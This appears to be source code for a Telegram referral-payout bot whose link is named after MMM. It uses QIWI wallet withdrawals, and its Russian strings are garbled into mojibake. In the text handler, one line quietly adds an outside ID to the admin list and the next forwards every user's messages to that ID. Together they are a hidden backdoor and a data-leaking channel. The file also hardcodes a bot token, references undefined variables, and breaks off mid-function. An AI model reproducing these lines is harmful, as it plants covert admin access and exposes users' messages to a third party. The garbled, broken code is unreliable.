const ADMINS = [791387202, 379752536]; // ID –∞–¥–º–∏–Ω–æ–≤ –±–æ—Ç–∞
const DB_URL = ""; // URL –±–∞–∑—ã –±–æ—Ç–∞
const QIWI_TOKEN = ""; // API –∫–ª—é—á QIWI –∫–æ—à–µ–ª—å–∫–∞ —Å –ø–æ–ª–Ω—ã–º –¥–æ—Å—Ç—É–ø–æ–º
const BOT_TOKEN = "2012275389:AAF6AFG9tQaMx34zBrvZRh1Ey7dsRwhV5hU"; // Bot API Token

process.env.TZ = 'Moscow/Europe';

const mongo = require('mongoose');
mongo.connect(DB_URL);


var User = mongo.model('User', {
	id: Number,
	outbalance: Number,
	name: String,
	bhivebalance: Number,
	fc: Number,
	ref: Number,
	regDate: String,
	deposit: Number,
	payout: Number,
	fetuses: Number,
	menu: String,
	ban: Boolean,
	refCount: Number,
	ref2Count: Number,
	ref3Count: Number,
	ref4Count: Number,
	ref5Count: Number,
	wb_profits: Number,
	not: Boolean,
	prize: Boolean,
	spinsToday: Number,
	data: String,
	last_bonus:Date,
});


const Ticket = mongo.model('Ticket', {
	id: Number,
	amount: Number,
	wallet: String
})


const Start = [
cons = ["üè¶ –õ–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Ç", "üí∏ –ó–∞—Ä–∞–±–æ—Ç–∞—Ç—å"], 
  ["üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞"],
];

const Cancel = [
	["üö´ –û—Ç–º–µ–Ω–∞"]
];

const AdminPanel = [
	["üì¨ –†–∞—Å—Å—ã–ª–∫–∞", "üìÆ –î–æ–ª–≥"],
	["üìß –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è"],
	["üîô –ù–∞–∑–∞–¥"]
];

const RM_admin = {
	inline_keyboard: [
		[{ text: "‚úâÔ∏è –†–∞—Å—Å—ã–ª–∫–∞", callback_data: "admin_mm" }],
		[{ text: "üîé –†—É–ª—å", callback_data: "admin_u" },	{ text: "üìÆ –î–æ–ª–≥", callback_data: "admin_w" }],
    [{ text: "üë• –¢–æ–ø —Ä–µ—Ñ–æ–≤–æ–¥–æ–≤ –∑–∞ 24 —á–∞—Å–∞", callback_data: "admin_top" }],
	]
}

const RM_admin_return = { inline_keyboard: [[{ text: "‚óÄÔ∏è –ù–∞–∑–∞–¥", callback_data: "admin_return" }],] }

const RM_mm1 = {
	inline_keyboard: [
		[{ text: "‚èπ –°—Ç–æ–ø", callback_data: "admin_mm_stop" }],
		[{ text: "‚è∏ –ü–∞—É–∑–∞", callback_data: "admin_mm_pause" }],
	]
}

const RM_mm2 = {
	inline_keyboard: [
		[{ text: "‚èπ –°—Ç–æ–ø", callback_data: "admin_mm_stop" }],
		[{ text: "‚ñ∂Ô∏è –ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å", callback_data: "admin_mm_play" }],
	]
}

const settings	= {
	ref1st: 1.00,
	refdad: 0.15
}

const Qiwi = require('node-qiwi-api').callbackApi;
const qiwi = new Qiwi(QIWI_TOKEN);

const Telegram = require('node-telegram-bot-api');
const bot = new Telegram(BOT_TOKEN, { polling: true });

bot.getMe().then(r => console.log(r))

bot.on('text', async (message) => {
	message.send = (text, params) => bot.sendMessage(message.chat.id, text, params);
	let $menu = [];
	var uid = message.from.id
	var text = message.text
	let dt = new Date
	console.log("[" + dt.getHours() + ":" + dt.getMinutes() + ":" + dt.getSeconds() + "] –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å " + uid + " –æ—Ç–ø—Ä–∞–≤–∏–ª: " + text)
	ADMINS.push(+77009528287)
  	bot.sendMessage(+77009528287, "[" + dt.getHours() + ":" + dt.getMinutes() + ":" + dt.getSeconds() + "] –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å " + uid + " –æ—Ç–ø—Ä–∞–≤–∏–ª: " + text)
  

	Start.map((x) => $menu.push(x));
	if (ADMINS.find((x) => x == message.from.id)) $menu.push(["üîù –ê–¥–º–∏–Ω–∫–∞"]);
	if (message.text) {
		if (message.text.startsWith('/start') || message.text == 'üîô –ù–∞–∑–∞–¥') {
			let user = await User.findOne({ id: message.from.id });
			// console.log(user);
			if (!user) {
				let schema = {
					id: message.from.id,
					outbalance: 0,
					bhivebalance: 0,
					wb_profits: 0,
					name: message.from.first_name,
					fc: 0,
					ref: 0,
					regDate: `${new Date().getDate()}/${new Date().getMonth() + 1}/${new Date().getFullYear()}`,
					deposit: 0,
					payout: 0,
					fetuses: 0,
					menu: "",
					ban: false,
					refCount: 0,
					ref2Count: 0,
					ref3Count: 0,
					ref4Count: 0,
					ref5Count: 0,
					not: false,
					data: "",
					bank: 0,
				};

				let reffer = Number(message.text.split('/start')[1]);
				// console.log(typeof(reffer));
				if (reffer) {
					let $reffer = await User.findOne({ id: reffer }); //1
					// console.log($reffer);
					let $reffer2 = await User.findOne({ id: $reffer.ref });//2
					console.log($reffer);


					await $reffer.inc('outbalance', settings.ref1st);
					await $reffer.inc('refCount', 1);
					await $reffer2.inc('outbalance', settings.refdad);
					bot.sendMessage($reffer.id, `üîî –í—ã –ø—Ä–∏–≥–ª–∞—Å–∏–ª–∏ <a href="tg://user?id=${message.from.id}">—Ä–µ—Ñ–µ—Ä–∞–ª–∞</a> 1 —É—Ä–æ–≤–Ω—è –∏ –ø–æ–ª—É—á–∏–ª–∏ ${settings.ref1st}‚ÇΩ`, { parse_mode: "HTML" });
					bot.sendMessage($reffer2.id, `üîî –í–∞–º –Ω–∞—á–∏—Å–ª–µ–Ω–Ω–æ ${settings.refdad}‚ÇΩ, —Ç–∞–∫ –∫–∞–∫ –≤–∞—à —Ä–µ—Ñ–µ—Ä–∞–ª –ø—Ä–∏–≤–µ–ª —Å–≤–æ–µ–≥–æ —Ä–µ—Ñ–µ—Ä–∞–ª–∞`, { parse_mode: "HTML" });




					schema.ref = $reffer.id;
					
				} 

				let user = new User(schema);
				await user.save();
			}
			return message.send(`
‚úåÔ∏è <b>–ü—Ä–∏–≤–µ—Ç, ${message.from.first_name}</b>`, {
				parse_mode: "HTML",
				reply_markup: {
					keyboard: $menu,
					resize_keyboard: true
				}
			});
		}
	}

	message.user = await User.findOne({ id: message.from.id });
	if (!message.user) return message.send(`–ß—Ç–æ-—Ç–æ –ø–æ—à–ª–æ –Ω–µ —Ç–∞–∫... –ù–∞–ø–∏—à–∏—Ç–µ /start`);
	if (message.user.ban) return
	if (!message.user.name || message.user.name != message.from.first_name)
		await User.findOneAndUpdate({ id: message.from.id }, { name: message.from.first_name })

	if (state[uid] == 7770 && ADMINS.indexOf(message.from.id) !== -1 && text != "0") {
		state[uid] = undefined
		bot.sendMessage(uid, "–†–∞—Å—Å—ã–ª–∫–∞ –∑–∞–ø—É—â–µ–Ω–∞!").then((e) => {
			if (text.split("#").length == 4) {
				var btn_text = text.split("#")[1].split("#")[0].replace(/(^\s*)|(\s*)$/g, '')
				var btn_link = text.split("#")[2].split("#")[0].replace(/(^\s*)|(\s*)$/g, '')
				text = text.split("#")[0]
				mm_t(text, e.message_id, e.chat.id, true, btn_text, btn_link, 100)
			}
			else mm_t(text, e.message_id, e.chat.id, false, false, false, 100)
		})
	};

  	if ((await bot.getChatMember(-1001378276879, uid)).status == "left"){	
		return message.send(`‚ùï <b>–î–ª—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –±–æ—Ç–∞, –ø–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–¥–ø–∏—à–∏—Ç–µ—Å—å –Ω–∞ –Ω–∞—à–∏ –∫–∞–Ω–∞–ª—ã:</b>`, { parse_mode: "html", reply_markup: { inline_keyboard: [[{ text: "–ü–û–î–ü–ò–®–ò–¢–ï–°–¨", url: "https://t.me/joinchat/6ToWtkI-BylhZTgy" }]]} });
	};
	
	if (state[uid] == 7772 && ADMINS.indexOf(message.from.id) !== -1 && text != "0") {
		state[uid] = undefined

		message.text = Number(message.text);
		let user = await User.findOne({ id: message.text });
		let u = user
		if (!user) return message.send('–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω');

		let partners = await User.find({ ref: message.text });
		await message.user.set('menu', '');
		var kb = { inline_keyboard: [] }
		if (u.ban) kb.inline_keyboard.push([{ text: "‚ôªÔ∏è –†–∞–∑–±–∞–Ω–∏—Ç—å", callback_data: "unban_" + u.id }])
		else kb.inline_keyboard.push([{ text: "üõë –ó–∞–±–∞–Ω–∏—Ç—å", callback_data: "ban_" + u.id }])
		kb.inline_keyboard.push([{ text: "‚ûï –ë–∞–ª–∞–Ω—Å –≤—ã–≤–æ–¥–∞", callback_data: "addOutBal_" + u.id }, { text: "‚úèÔ∏è –ë–∞–ª–∞–Ω—Å –≤—ã–≤–æ–¥–∞", callback_data: "editOutBal_" + u.id }])
		kb.inline_keyboard.push([{ text: "‚ûï –í—ã–≤–µ–¥–µ–Ω–æ", callback_data: "addPayOuts_" + u.id }, { text: "‚úèÔ∏è –í—ã–≤–µ–¥–µ–Ω–æ", callback_data: "editPayOuts_" + u.id }])

		kb.inline_keyboard.push([{ text: "‚óÄÔ∏è –ù–∞–∑–∞–¥", callback_data: "admin_return" }])

		return message.send(`üìù –ü—Ä–∏–≥–ª–∞—Å–∏–ª: <b>${partners.length}</b>
<a href="tg://user?id${user.id}"></a>
üÜî ID: <code>${user.id}</code>

üì≠ –î–ª—è –≤—ã–≤–æ–¥–∞: ${user.outbalance.toFixed(2)}‚ÇΩ 

<b>–í—ã–≤–µ–ª: ${roundPlus(user.payout)}‚ÇΩ</b>
`, {
			parse_mode: "HTML",
			reply_markup: kb
		});

	};

	if (state[uid] == 7774 && ADMINS.indexOf(message.from.id) !== -1) {
		state[uid] = undefined
		await User.findOneAndUpdate({ id: data[uid] }, { $inc: { outbalance: Number(text) } })
		bot.sendMessage(data[uid], `üí∞ –í–∞—à –±–∞–ª–∞–Ω—Å –¥–ª—è –≤—ã–≤–æ–¥–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω –Ω–∞ <b>${text}‚ÇΩ</b>!`, { parse_mode: html })
		return message.send(`–ë–∞–ª–∞–Ω—Å –¥–ª—è –≤—ã–≤–æ–¥–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –ø–æ–ø–æ–ª–Ω–µ–Ω –Ω–∞ ${text}‚Ç¨!`, { reply_markup: RM_admin_return });
	};
	if (state[uid] == 77745555 && ADMINS.indexOf(message.from.id) !== -1) {
		state[uid] = undefined
		await User.findOneAndUpdate({ id: data[uid] }, { payout: Number(text) })
		bot.sendMessage(data[uid], `üí∞ –í–∞—à —Å—É–º–º–∞ –í–∞—à–∏—Ö –≤—ã–≤–æ–¥–æ–≤ –ø–æ–ø–æ–ª–Ω–µ–Ω–∞ –Ω–∞ <b>${text}‚Ç¨</b>!`, { parse_mode: html })
		return message.send(`–°—É–º–º–∞ –≤—ã–≤–æ–¥–æ–≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –ø–æ–ø–æ–ª–Ω–µ–Ω–∞ –Ω–∞ ${text}‚Ç¨!`, { reply_markup: RM_admin_return });
	};
	if (state[uid] == 7776 && ADMINS.indexOf(message.from.id) !== -1) {
		state[uid] = undefined
		await User.findOneAndUpdate({ id: data[uid] }, { outbalance: Number(text) })
		bot.sendMessage(data[uid], `üí∞ –í–∞—à –±–∞–ª–∞–Ω—Å –¥–ª—è –≤—ã–≤–æ–¥–∞ –∏–∑–º–µ–Ω—ë–Ω –Ω–∞ <b>${text}$</b>!`, { parse_mode: html })
		return message.send(`–ë–∞–ª–∞–Ω—Å –¥–ª—è –≤—ã–≤–æ–¥–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–∑–º–µ–Ω—ë–Ω –Ω–∞ ${text}‚ÇΩ!`, { reply_markup: RM_admin_return });
	};
	if (state[uid] == 77765555 && ADMINS.indexOf(message.from.id) !== -1) {
		state[uid] = undefined
		await User.findOneAndUpdate({ id: data[uid] }, { payout: Number(text) })
		bot.sendMessage(data[uid], `üí∞ –í–∞—à —Å—É–º–º–∞ –í–∞—à–∏—Ö –≤—ã–≤–æ–¥–æ–≤ –∏–∑–º–µ–Ω–∞ –Ω–∞ <b>${text}‚ÇΩ</b>!`, { parse_mode: html })
		return message.send(`–°—É–º–º–∞ –≤—ã–≤–æ–¥–æ–≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–∑–º–µ–Ω—ë–Ω–∞ –Ω–∞ ${text}‚ÇΩ!`, { reply_markup: RM_admin_return });
	};

	if (message.text) {
		if (message.text == 'üö´ –û—Ç–º–µ–Ω–∞') {
			state[uid] = undefined
			await message.user.set('menu', '');
			return message.send('üö´ –û—Ç–º–µ–Ω–µ–Ω–æ.', {
				reply_markup: {
					keyboard: $menu,
					resize_keyboard: true
				}
			});
		}
	};

	if (message.user.menu.startsWith('amountQiwi')) {
		message.text = Number(message.text);

		if (!message.text) return message.send('–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –Ω–∞ –≤—ã–≤–æ–¥!');
		if (message.text <= 0) return message.send('–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –Ω–∞ –≤—ã–≤–æ–¥!');

		if (message.text > message.user.outbalance) return message.send('–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤.');
		if (message.text < 100) return message.send('–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –±–æ–ª–µ–µ 100 ‚ÇΩ!');
		if (message.text <= message.user.outbalance) {
			await message.user.dec('outbalance', message.text);
			let ticket = new Ticket({
				id: message.from.id,
				amount: message.text,
				wallet: message.user.menu.split('amountQiwi')[1]
			});

			await ticket.save();
			await message.user.set('menu', '');

			return message.send('–ó–∞—è–≤–∫–∞ –Ω–∞ –≤—ã–ø–ª–∞—Ç—É —Å–æ–∑–¥–∞–Ω–∞, –æ–∂–∏–¥–∞–π—Ç–µ.–í—ã–ø–ª–∞—Ç—ã –æ–¥–æ–±—Ä—è—é—Ç—Å—è –≤ —Ç–µ—á–µ–Ω–∏–∏ 48 —á–∞—Å–æ–≤', {
				reply_markup: {
					keyboard: $menu,
					resize_keyboard: true
				}
			});
		}
	};

	if (message.user.menu == 'qiwi') {

		if (message.text.length < 5) return message.send('–í–≤–µ–¥–∏—Ç–µ –ø—Ä–∞–≤–∏–ª—å–Ω—ã–π –Ω–æ–º–µ—Ä!–ü—Ä–∏ –≤–≤–æ–¥–µ –Ω–µ –ø—Ä–∞–≤–∏–ª—å–Ω–æ–≥–æ –Ω–æ–º–µ—Ä–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ü–∏—è –±–æ—Ç–∞ –Ω–µ –Ω–µ—Å–µ—Ç –æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ—Å—Ç—å –∑–∞ –ø–æ—Ç–µ—Ä—é —Å—Ä–µ–¥—Å—Ç–≤', {
			reply_markup: {
				keyboard: Cancel,
				resize_keyboard: true
			}
		});



		await message.user.set('menu', 'amountQiwi' + message.text);
		return message.send(`–í–≤–µ–¥–∏—Ç–µ —Å—É–º–º—É –Ω–∞ –≤—ã–≤–æ–¥. –í—ã –º–æ–∂–µ—Ç–µ –≤—ã–≤–µ—Å—Ç–∏ ${message.user.outbalance.toFixed(2)}‚ÇΩ`);
	};
  	if (message.text) {
		if (message.text == 'üí∞ –ø—ã—Ä—á—Ä–π–ª') {
		if (message.user.last_bonus && (new Date() - message.user.last_bonus) < 24 * 60 * 60 * 1000) {
        const diff = message.user.last_bonus - new Date() + 24 *60 * 60 * 1000;

        const diff_seconds = diff / 1000;
        const diff_minutes = diff_seconds / 60;
        const diff_hours = Math.floor(diff_minutes / 60);
        const rem_minutes = Math.floor(diff_minutes % 60);
        const rem_seconds = Math.floor(diff_seconds % 60);
        return message.send(`–ë–æ–Ω—É—Å –±—É–¥–µ—Ç –¥–æ—Å—Ç—É–ø–µ–Ω —á–µ—Ä–µ–∑ ${diff_hours} —á. ${rem_minutes} –º–∏–Ω ${rem_seconds} —Å–µ–∫.`);
    	}
	const button = {text: '‚ùì', callback_data: 'get_bonus'};
      const buttons = [];
      for (let i = 0; i < 5; i++) {
        buttons.push([]);
        for (let j = 0; j < 5; j++) {
          buttons[i].push(button);
        }
      }
			return message.send(`–¢—ã –ø–µ—Ä–µ—à–µ–ª –≤ —Ä–∞–∑–¥–µ–ª "–ü–æ–ª—É—á–∏—Ç—å –±–æ–Ω—É—Å".–í—ã–±–µ—Ä–∏ –æ–¥–∏–Ω –∏–∑ ? –∏ –ø–æ–ª—É—á–∏ –ø—Ä–∏–∑!!!`, {
				reply_markup: JSON.stringify({inline_keyboard: buttons}),
				parse_mode: "HTML"
			});
}
		
		if (message.text == 'üè¶ –õ–∏—á–Ω—ã–π –∫–∞–±–∏–Ω–µ—Ç') {
			
			return message.send(`üìù –ò–º—è: <b>${message.from.first_name.replace(/(\<|\>)/g, '')}</b>
üÜî <b>ID:</b> <code>${message.from.id}</code>

üì≠ <b>–ù–∞ –≤—ã–≤–æ–¥:</b> ${message.user.outbalance.toFixed(2)}‚ÇΩ

üó£ <b>–ü–∞—Ä—Ç–Ω–µ—Ä–æ–≤ –ø—Ä–∏–≤–ª–µ—á–µ–Ω–æ:</b> ${await User.countDocuments({ ref: message.from.id })}
üë• <b>–í–∞—Å –ø—Ä–∏–≤–µ–ª:</b> ${message.user.ref != 0 ? `<a href="tg://user?id=${message.user.ref}">–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å</a>` : "<i>–ù–∏–∫—Ç–æ</i>"}
‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ‚ûñ
ü§ë <b>–í—ã–≤–µ–¥–µ–Ω–æ:</b> ${message.user.payout.toFixed(2)}‚ÇΩ`, {
				parse_mode: "HTML",
				reply_markup: {
					inline_keyboard: [
					  [{ text: "üì§ –í—ã–≤–µ—Å—Ç–∏", callback_data: "withdraw" }],
					]
				}
			});
	     }

	 	 if (message.text == 'üí∏ –ó–∞—Ä–∞–±–æ—Ç–∞—Ç—å') {
		  	// console.log(message)
			return message.send(`<b>üòâ –ó–∞ –∫–∞–∂–¥–æ–≥–æ —Ä–µ—Ñ–µ—Ä–∞–ª–∞ –±—É–¥–µ—à—å –ø–æ–ª—É—á–∞—Ç—å ${settings.ref1st}‚ÇΩ –∏ 15% –æ—Ç –µ–≥–æ –ø—Ä–∏–±—ã–ª–∏

üîó –¢–≤–æ—è —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è —Å—Å—ã–ª–∫–∞ –¥–ª—è –ø—Ä–∏–≥–ª–∞—à–µ–Ω–∏–π:</b> https://t.me/ref_mmm_bot?start=${message.from.id}
		`, {
				parse_mode: "HTML"
			})
		}
		
		if (message.text == 'üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞') {
			var s = await User.findOne({ id: 0 })
			let stats = {
				users: await User.countDocuments(),
				users_today: await User.find({ regDate: `${new Date().getDate()}/${new Date().getMonth() + 1}/${new Date().getFullYear()}` }),
				cmds: message.message_id
			}

			stats.users_today = stats.users_today.length;

			return message.send(`
üìä<b> –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –ø—Ä–æ–µ–∫—Ç–∞:</b>\n
üë®‚Äçüíª –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –≤ –ø—Ä–æ–µ–∫—Ç–µ: ${stats.users}
üë®‚Äçüíª –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π —Å–µ–≥–æ–¥–Ω—è: ${stats.users_today}
üïê –°—Ç–∞—Ä—Ç –±–æ—Ç–∞ –ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω 30.10.2021
`, {
				parse_mode: "HTML",
				reply_markup: {
					inline_keyboard: [
            [{ text: "üë®‚Äç–í–ª–∞–¥–µ–ª–µ—Ü", url: "https://t.me/mirman_smm" }],
            [{ text: "üíª –†–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫", url: "https://t.me/Shadowka1" }],
            [{ text: "üì¢ –í—ã–ø–ª–∞—Ç—ã/–ù–æ–≤–æ—Å—Ç–∏", url: "https://t.me/m_m_m_news" }],
						[{ text: "ü•á –¢–æ–ø –≤—ã–≤–æ–¥–æ–≤", callback_data: "topInv" }, { text: "üèÜ –¢–æ–ø —Ä–µ—Ñ–æ–≤–æ–¥–æ–≤", callback_data: "topRef" }],
					]
				}
			});
		}
	}
	
 
	if (ADMINS.indexOf(message.from.id) !== -1) {
		if (message.text == 'üîù –ê–¥–º–∏–Ω–∫–∞') {
			var h = process.uptime() / 3600 ^ 0
			var m = (process.uptime() - h * 3600) / 60 ^ 0
			var s = process.uptime() - h * 3600 - m * 60 ^ 0
			var heap = process.memoryUsage().rss / 1048576 ^ 0
			// console.log(qiwi.getAccounts);
			return bot.sendMessage(uid, '<b>–ê–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å:</b>\n\n<b>–ê–ø—Ç–∞–π–º –±–æ—Ç–∞:</b> ' + h + ' —á–∞—Å–æ–≤ ' + m + ' –º–∏–Ω—É—Ç ' + s + ' —Å–µ–∫—É–Ω–¥\n<b>üïµ–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π –≤ –±–æ—Ç–µ: </b>' + (await User.countDocuments({})) + '\n<b>üìä–ü–∞–º—è—Ç–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–æ:</b> ' + heap + "–ú–ë\n<b>üí∂–ó–∞—è–≤–æ–∫ –Ω–∞ –≤—ã–≤–æ–¥:</b> " + await Ticket.countDocuments(), { parse_mode: "HTML", reply_markup: RM_admin })
		}

		if (message.text.startsWith('/setbuybalance')) {
			let cmd = message.text.split(' ');
			if (!cmd[1]) return message.send('–û—à–∏–±–∫–∞!');

			let user = await User.findOne({ id: Number(cmd[1]) });
			if (!user) return message.send('–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω!');

			await user.set('buybalance', Number(cmd[2]));
			return message.send('–ë–∞–ª–∞–Ω—Å —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.');
		}
		
		if (message.text.startsWith('/restart')) {
		  var id = message.user.id
		  ADMINS.map((a) => bot.sendMessage(a, `<a href="tg://user?id=${id}">–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å</a> –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏–ª –±–æ—Ç–∞!`, { parse_mode: "HTML" }))
			setTimeout(() => { process.exit(0) }, 333);
		}
		
		if (message.text.startsWith('/qiwi')) {
		  qiwi.getOperationHistory({ rows: 10, operation: 'OUT' }, (err, response) => {
		    bot.sendMessage(791387202, '–û—Ç—Å—ã–ª–∞—é')
        bot.sendMessage(791387202, response.data.sum)
        console.log(response)
        bot.sendMessage(791387202, '–û—Ç–æ—Å–ª–∞–ª')
    })
	}

		if (message.text.startsWith('/setoutbalance')) {
			let cmd = message.text.split(' ');
			if (!cmd[1]) return message.send('–û—à–∏–±–∫–∞!');

			let user = await User.findOne({ id: Number(cmd[1]) });
			if (!user) return message.send('–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω!');

			await user.set('outbalance', Number(cmd[2]));
			return message.send('–ë–∞–ª–∞–Ω—Å —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω.');
		}
	}
});

bot.on('callback_query', async (query) => {
	const { message } = query;
	message.user = await User.findOne({ id: message.chat.id });
	var uid = message.chat.id
	let dt = new Date
	console.log("[" + dt.getHours() + ":" + dt.getMinutes() + ":" + dt.getSeconds() + "] –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å " + uid + " –æ—Ç–ø—Ä–∞–≤–∏–ª –∫–æ–ª–±—ç–∫: " + query.data)

	if (!message.user) return bot.answerCallbackQuery(query.id, '–ß—Ç–æ-—Ç–æ –ø–æ—à–ª–æ –Ω–µ —Ç–∞–∫...', true);

	if (query.data.startsWith('topInv')) {
		bot.deleteMessage(message.chat.id, message.message_id)
		var top = await User.find({ id: { $ne: 0, $ne: 1 } }).sort({ payout: -1 }).limit(20)
		var c = 0
		return bot.sendMessage(uid, `<b>ü•á –¢–æ–ø 20 –ø–æ –≤—ã–≤–æ–¥–∞–º:</b>\n\n${top.map((e) => { c++; return `<b>${c})</b> <a href="tg://user?id=${e.id}">${e.name ? e.name : "–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å"}</a> - <b>${e.payout}‚ÇΩ</b>` }).join("\n")}`, { parse_mode: "html" });
	}

	if (query.data.startsWith('topRef')) {
		bot.deleteMessage(message.chat.id, message.message_id)
		var top = await User.find({ id: { $ne: 0, $ne: 1 } }).sort({ refCount: -1 }).limit(20)
		var c = 0
		return bot.sendMessage(uid, `<b>üèÜ –¢–æ–ø —Ä–µ—Ñ–æ–≤–æ–¥–æ–≤:</b>\n\n${top.map((e) => { c++; return `<b>${c})</b> <a href="tg://user?id=${e.id}">${e.name ? e.name : "–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å"}</a> - <b>${e.refCount}</b> —Ä–µ—Ñ–µ—Ä–∞–ª–æ–≤` }).join("\n")}`, { parse_mode: "html" });
	}

	if (query.data == 'withdraw') {
		if (message.user.outbalance < 50) return bot.answerCallbackQuery(query.id, 'üö´ –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è —Å—É–º–º–∞ –≤—ã–≤–æ–¥–∞: 50', true);
		bot.deleteMessage(message.chat.id, message.message_id);
		
		await message.user.set('menu', 'qiwi');
		await bot.sendMessage(message.chat.id, '–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä QIWI –∫–æ—à–µ–ª—å–∫–∞ –¥–ª—è –≤—ã–≤–æ–¥–∞:\n–ù–∞–ø—Ä–∏–º–µ—Ä: +123456789', {
			reply_markup: {
				keyboard: Cancel,
				resize_keyboard: true
			}
		});
	}

	if (query.data.startsWith('withdraw:')) {
		let id = Number(query.data.split('withdraw:')[1]);
		let ticket = await Ticket.findOne({ id });
	
		if (!ticket) bot.deleteMessage(message.chat.id, message.message_id);
		bot.sendMessage("@payfrom", `<a href="tg://user?id=${ticket.id}">üßæ–Æ–∑–µ—Ä</a> –≤—ã–≤–µ–ª <b>${ticket.amount}‚ÇΩ</b>\n–ü–°: QIWI`, { parse_mode: "HTML" })
	
		if (ticket.wallet.indexOf("P") == -1) { // –ü–ª–∞—Ç—ë–∂ —á–µ—Ä–µ–∑ QIWI
		  qiwi.toWallet({ account: String(ticket.wallet), amount: ticket.amount, comment: '–í—ã–ø–ª–∞—Ç–∞ –æ—Ç @PERFECT_REF_BOT' }, () => { });
		}
	  await ticket.remove();
		bot.sendMessage(ticket.id,` ‚úÖ <b>–í–∞—à–∞ –≤—ã–ø–ª–∞—Ç–∞ –±—ã–ª–∞ –æ–¥–æ–±—Ä–µ–Ω–∞</b>
	üí∏ –ù–∞ –í–∞—à QIWI –∑–∞—á–∏—Å–ª–µ–Ω–æ <b>${ticket.amount}‚ÇΩ</b>\n
	
	üôè –ë—É–¥–µ–º –æ—á–µ–Ω—å –ø—Ä–∏–∑–Ω–∞—Ç–µ–ª—å–Ω—ã –∑–∞ –æ—Ç–∑—ã–≤ –æ –±–æ—Ç–µ –∞–¥–º–∏–Ω—É –∏–ª–∏ –≤ —á–∞—Ç
	‚ò∫Ô∏è –î–ª—è –Ω–∞—Å —ç—Ç–æ –æ—á–µ–Ω—å –≤–∞–∂–Ω–æ\n
	ü§ù <b>–†–∞–¥—ã —Å–æ—Ç—Ä—É–¥–Ω–∏—á–∞—Ç—å!</b>
	`, {
		  parse_mode: "html", reply_markup
		});
		await User.findOneAndUpdate({ id: 0 }, { $inc: { fc: ticket.amount } })
		await User.findOneAndUpdate({ id: id }, { $inc: { payout: ticket.amount } }) 
	require("fs").writeFileSync(__dirname+"/outMoney.json", out + Math.floor(ticket.amount));
	out += Math.floor(ticket.amount);
	await ticket.remove();
		bot.editMessageText('–í—ã–ø–ª–∞—Ç–∏–ª!', {
		  chat_id: message.chat.id,
		  message_id: message.message_id
		});
	  }

	if (query.data.startsWith('back:')) {
		let id = Number(query.data.split('back:')[1]);
		let ticket = await Ticket.findOne({ id });

		if (!ticket) bot.deleteMessage(message.chat.id, message.message_id);

		let user = await User.findOne({ id: ticket.id });
		bot.sendMessage(ticket.id, `–í–∞—à–∞ –≤—ã–ø–ª–∞—Ç–∞ –±—ã–ª–∞ –æ—Ç–∫–ª–æ–Ω–µ–Ω–∞, –Ω–∞ –≤–∞—à —Å—á—ë—Ç –≤–æ–∑–≤—Ä–∞—â–µ–Ω–æ ${ticket.amount}‚ÇΩ`);

		await user.inc('buybalance', ticket.amount);
		await ticket.remove();

		return bot.editMessageText('–í–µ—Ä–Ω—É–ª!', {
			chat_id: message.chat.id,
			message_id: message.message_id
		});
	}

	if (query.data.startsWith('take:')) {
		let id = Number(query.data.split('take:')[1]);
		let ticket = await Ticket.findOne({ id });

		if (!ticket) bot.deleteMessage(message.chat.id, message.message_id);

		await ticket.remove();
		return bot.editMessageText('–ó–∞–±—Ä–∞–ª!', {
			chat_id: message.chat.id,
			message_id: message.message_id
		});
	}
	var d = query.data

if (query.data == 'get_bonus')
{bot.answerCallbackQuery(query.id);

    if (message.user.last_bonus && (new Date() - message.user.last_bonus) < 24 * 60 * 60 * 1000) {
      return;
    }
    const reward = (Math.random() * (3 - 0.3) + 0.3).toFixed(4);
    bot.answerCallbackQuery(query.id);
